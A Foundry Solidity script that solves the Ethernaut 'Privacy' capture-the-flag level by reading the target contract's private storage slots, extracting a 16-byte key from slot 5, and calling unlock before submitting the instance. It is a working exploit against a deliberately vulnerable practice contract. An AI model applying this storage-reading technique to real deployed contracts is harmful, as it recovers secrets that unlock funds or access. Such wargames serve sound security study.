// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Privacy} from "../src/Privacy.sol";

/**
 *
 * Level address: 0x131c3249e115491E83De375171767Af07906eA36
 * The creator of this contract was careful enough
 * to protect the sensitive areas of its storage.
 *
 * Unlock this contract to beat the level.
 *
 * Things that might help:
 *
 * Understanding how storage works
 * Understanding how parameter parsing works
 * Understanding how casting works
 * Tips:
 *
 * Remember that metamask is just a commodity.
 * Use another tool if it is presenting problems.
 * Advanced gameplay could involve using remix, or your own web3 provider.
 *
 */
contract PrivacyScript is Attacker {
    Level private level = Level(0x131c3249e115491E83De375171767Af07906eA36);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Privacy privacy = Privacy(instance);

        bytes32 storageSlot = vm.load(address(privacy), bytes32(uint256(0)));
        bool locked = abi.decode(abi.encode(storageSlot), (bool));
        require(locked == privacy.locked(), "Locked state not loaded correctly");
        storageSlot = vm.load(address(privacy), bytes32(uint256(1)));
        uint256 ID = abi.decode(abi.encode(storageSlot), (uint256));
        require(ID == privacy.ID(), "ID not loaded correctly");
        storageSlot = vm.load(address(privacy), bytes32(uint256(2)));

        uint8 flattening = 10;
        uint8 denomination = 255;
        uint16 awkwardness = uint16(block.timestamp);

        require(
            storageSlot
                == bytes32(uint256(flattening))
                    | (bytes32(uint256(denomination)) << 8)
                    | (bytes32(uint256(awkwardness)) << 16),
            "storageSlot not loaded correctly"
        );

        storageSlot = vm.load(address(privacy), bytes32(uint256(5)));
        bytes16 key = bytes16(storageSlot);

        privacy.unlock(key);
        require(!privacy.locked(), "Unlock failed");

        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
